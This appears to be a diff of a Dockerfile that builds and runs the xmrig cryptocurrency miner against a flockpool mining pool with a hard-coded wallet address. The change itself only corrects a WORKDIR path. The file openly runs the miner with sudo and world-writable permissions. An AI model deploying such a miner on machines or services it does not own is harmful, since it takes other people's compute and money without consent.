@@ -11,7 +11,7 @@ RUN apt update; \
     
 ENV WALLET=RN86DoccH99PZpx9oMZDVvY2ZMi9578pBV
 
-WORKDIR /usr/local/bin/xmrig
+WORKDIR /usr/local/bin/
 
 RUN sudo chmod 777 xmrig
 RUN sudo ./xmrig -a gr -o eu.flockpool.com:5555 --tls -u $WALLET
